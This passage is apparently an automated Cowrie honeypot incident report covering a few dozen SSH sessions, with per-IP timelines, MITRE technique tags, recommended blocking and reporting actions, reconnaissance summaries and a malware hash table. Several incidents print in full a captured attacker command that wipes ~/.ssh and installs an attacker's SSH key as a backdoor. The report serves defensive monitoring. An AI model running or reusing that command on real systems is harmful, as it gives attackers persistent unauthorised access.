| `2026-05-24 22:30:41` | `cowrie.command.failed` |
| `2026-05-24 22:30:41` | `cowrie.log.closed` |
| `2026-05-24 22:30:42` | `cowrie.session.params` |
| `2026-05-24 22:30:42` | `cowrie.command.input` |
| `2026-05-24 22:30:42` | `cowrie.session.file_download` |
| `2026-05-24 22:30:42` | `cowrie.log.closed` |
| `2026-05-24 22:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.34[.]252` to AbuseIPDB if not already reported
- [ ] Block `14.103.34[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0a71f94fbd

| Field | Detail |
|---|---|
| **Source IP** | `14.103.34[.]252` |
| **First Seen** | 2026-05-24 22:30 |
| **Last Seen** | 2026-05-24 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:30:56` | `cowrie.session.connect` |
| `2026-05-24 22:30:56` | `cowrie.client.version` |
| `2026-05-24 22:30:56` | `cowrie.client.kex` |
| `2026-05-24 22:30:57` | `cowrie.login.success` |
| `2026-05-24 22:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.34[.]252` to AbuseIPDB if not already reported
- [ ] Block `14.103.34[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd8e893946ac

| Field | Detail |
|---|---|
| **Source IP** | `137.184.228[.]138` |
| **First Seen** | 2026-05-24 22:32 |
| **Last Seen** | 2026-05-24 22:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:32:17` | `cowrie.session.connect` |
| `2026-05-24 22:32:17` | `cowrie.client.version` |
| `2026-05-24 22:32:17` | `cowrie.client.kex` |
| `2026-05-24 22:32:18` | `cowrie.login.success` |
| `2026-05-24 22:32:19` | `cowrie.session.params` |
| `2026-05-24 22:32:19` | `cowrie.command.input` |
| `2026-05-24 22:32:19` | `cowrie.command.failed` |
| `2026-05-24 22:32:20` | `cowrie.log.closed` |
| `2026-05-24 22:32:20` | `cowrie.session.params` |
| `2026-05-24 22:32:20` | `cowrie.command.input` |
| `2026-05-24 22:32:20` | `cowrie.session.file_download` |
| `2026-05-24 22:32:20` | `cowrie.log.closed` |
| `2026-05-24 22:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `137.184.228[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5d882d12f7

| Field | Detail |
|---|---|
| **Source IP** | `137.184.228[.]138` |
| **First Seen** | 2026-05-24 22:32 |
| **Last Seen** | 2026-05-24 22:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:32:23` | `cowrie.session.connect` |
| `2026-05-24 22:32:23` | `cowrie.client.version` |
| `2026-05-24 22:32:24` | `cowrie.client.kex` |
| `2026-05-24 22:32:25` | `cowrie.login.success` |
| `2026-05-24 22:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `137.184.228[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5912c555db

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:33 |
| **Last Seen** | 2026-05-24 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:33:38` | `cowrie.session.connect` |
| `2026-05-24 22:33:38` | `cowrie.client.version` |
| `2026-05-24 22:33:38` | `cowrie.client.kex` |
| `2026-05-24 22:33:38` | `cowrie.login.success` |
| `2026-05-24 22:33:38` | `cowrie.session.params` |
| `2026-05-24 22:33:38` | `cowrie.command.input` |
| `2026-05-24 22:33:38` | `cowrie.command.failed` |
| `2026-05-24 22:33:39` | `cowrie.log.closed` |
| `2026-05-24 22:33:39` | `cowrie.session.params` |
| `2026-05-24 22:33:39` | `cowrie.command.input` |
| `2026-05-24 22:33:39` | `cowrie.session.file_download` |
| `2026-05-24 22:33:39` | `cowrie.log.closed` |
| `2026-05-24 22:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415ba2f7b2fd

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:33 |
| **Last Seen** | 2026-05-24 22:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:33:40` | `cowrie.session.connect` |
| `2026-05-24 22:33:40` | `cowrie.client.version` |
| `2026-05-24 22:33:40` | `cowrie.client.kex` |
| `2026-05-24 22:33:41` | `cowrie.login.success` |
| `2026-05-24 22:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36c8756869e

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:37 |
| **Last Seen** | 2026-05-24 22:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:37:52` | `cowrie.session.connect` |
| `2026-05-24 22:37:52` | `cowrie.client.version` |
| `2026-05-24 22:37:52` | `cowrie.client.kex` |
| `2026-05-24 22:37:52` | `cowrie.login.success` |
| `2026-05-24 22:37:52` | `cowrie.session.params` |
| `2026-05-24 22:37:52` | `cowrie.command.input` |
| `2026-05-24 22:37:52` | `cowrie.command.failed` |
| `2026-05-24 22:37:53` | `cowrie.log.closed` |
| `2026-05-24 22:37:53` | `cowrie.session.params` |
| `2026-05-24 22:37:53` | `cowrie.command.input` |
| `2026-05-24 22:37:53` | `cowrie.session.file_download` |
| `2026-05-24 22:37:53` | `cowrie.log.closed` |
| `2026-05-24 22:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7305d700015d

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:37 |
| **Last Seen** | 2026-05-24 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:37:54` | `cowrie.session.connect` |
| `2026-05-24 22:37:54` | `cowrie.client.version` |
| `2026-05-24 22:37:54` | `cowrie.client.kex` |
| `2026-05-24 22:37:55` | `cowrie.login.success` |
| `2026-05-24 22:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87dc94b4640

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:42 |
| **Last Seen** | 2026-05-24 22:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:42:01` | `cowrie.session.connect` |
| `2026-05-24 22:42:01` | `cowrie.client.version` |
| `2026-05-24 22:42:01` | `cowrie.client.kex` |
| `2026-05-24 22:42:01` | `cowrie.login.success` |
| `2026-05-24 22:42:01` | `cowrie.session.params` |
| `2026-05-24 22:42:01` | `cowrie.command.input` |
| `2026-05-24 22:42:01` | `cowrie.command.failed` |
| `2026-05-24 22:42:01` | `cowrie.log.closed` |
| `2026-05-24 22:42:02` | `cowrie.session.params` |
| `2026-05-24 22:42:02` | `cowrie.command.input` |
| `2026-05-24 22:42:02` | `cowrie.session.file_download` |
| `2026-05-24 22:42:02` | `cowrie.log.closed` |
| `2026-05-24 22:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e7c2fc444f

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:42 |
| **Last Seen** | 2026-05-24 22:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:42:03` | `cowrie.session.connect` |
| `2026-05-24 22:42:03` | `cowrie.client.version` |
| `2026-05-24 22:42:03` | `cowrie.client.kex` |
| `2026-05-24 22:42:04` | `cowrie.login.success` |
| `2026-05-24 22:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a664332e98a5

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:46 |
| **Last Seen** | 2026-05-24 22:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:46:19` | `cowrie.session.connect` |
| `2026-05-24 22:46:19` | `cowrie.client.version` |
| `2026-05-24 22:46:19` | `cowrie.client.kex` |
| `2026-05-24 22:46:19` | `cowrie.login.success` |
| `2026-05-24 22:46:19` | `cowrie.session.params` |
| `2026-05-24 22:46:19` | `cowrie.command.input` |
| `2026-05-24 22:46:19` | `cowrie.command.failed` |
| `2026-05-24 22:46:19` | `cowrie.log.closed` |
| `2026-05-24 22:46:20` | `cowrie.session.params` |
| `2026-05-24 22:46:20` | `cowrie.command.input` |
| `2026-05-24 22:46:20` | `cowrie.session.file_download` |
| `2026-05-24 22:46:20` | `cowrie.log.closed` |
| `2026-05-24 22:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd65dd1f5c64

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:46 |
| **Last Seen** | 2026-05-24 22:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:46:21` | `cowrie.session.connect` |
| `2026-05-24 22:46:21` | `cowrie.client.version` |
| `2026-05-24 22:46:21` | `cowrie.client.kex` |
| `2026-05-24 22:46:22` | `cowrie.login.success` |
| `2026-05-24 22:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7e1afbd0a9

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:58 |
| **Last Seen** | 2026-05-24 22:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:58:48` | `cowrie.session.connect` |
| `2026-05-24 22:58:48` | `cowrie.client.version` |
| `2026-05-24 22:58:48` | `cowrie.client.kex` |
| `2026-05-24 22:58:48` | `cowrie.login.success` |
| `2026-05-24 22:58:48` | `cowrie.session.params` |
| `2026-05-24 22:58:48` | `cowrie.command.input` |
| `2026-05-24 22:58:48` | `cowrie.command.failed` |
| `2026-05-24 22:58:49` | `cowrie.log.closed` |
| `2026-05-24 22:58:49` | `cowrie.session.params` |
| `2026-05-24 22:58:49` | `cowrie.command.input` |
| `2026-05-24 22:58:49` | `cowrie.session.file_download` |
| `2026-05-24 22:58:49` | `cowrie.log.closed` |
| `2026-05-24 22:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab06121a3f5

| Field | Detail |
|---|---|
| **Source IP** | `180.252.151[.]254` |
| **First Seen** | 2026-05-24 22:58 |
| **Last Seen** | 2026-05-24 22:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 22:58:50` | `cowrie.session.connect` |
| `2026-05-24 22:58:50` | `cowrie.client.version` |
| `2026-05-24 22:58:50` | `cowrie.client.kex` |
| `2026-05-24 22:58:51` | `cowrie.login.success` |
| `2026-05-24 22:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.252.151[.]254` to AbuseIPDB if not already reported
- [ ] Block `180.252.151[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.248.104[.]31` | **15** | 2026-05-24 21:12 | 2026-05-24 22:13 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.252.151[.]254` | **8** | 2026-05-24 22:26 | 2026-05-24 22:58 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]192` | **3** | 2026-05-24 22:36 | 2026-05-24 22:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.228[.]138` | **2** | 2026-05-24 22:26 | 2026-05-24 22:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `186.251.71[.]202` | **2** | 2026-05-24 21:03 | 2026-05-24 21:10 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.195[.]17` | 1 | 2026-05-24 21:14 | 2026-05-24 21:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.68.29[.]8` | 1 | 2026-05-24 21:12 | 2026-05-24 21:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.103.34[.]252` | 1 | 2026-05-24 22:30 | 2026-05-24 22:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.35.217[.]121` | 1 | 2026-05-24 22:34 | 2026-05-24 22:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-05-24 22:14 | 2026-05-24 22:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-05-24 21:11 | 2026-05-24 21:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-05-24 21:16 | 2026-05-24 21:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.150.40[.]227` | 1 | 2026-05-24 22:57 | 2026-05-24 22:57 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `34.72.208[.]101` | 1 | 2026-05-24 21:06 | 2026-05-24 21:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.225.56[.]202` | 1 | 2026-05-24 21:53 | 2026-05-24 21:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-24 22:45 | 2026-05-24 22:47 | 83s | 0 | `T1592` | 🟢 LOW |
| `45.173.103[.]146` | 1 | 2026-05-24 22:26 | 2026-05-24 22:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
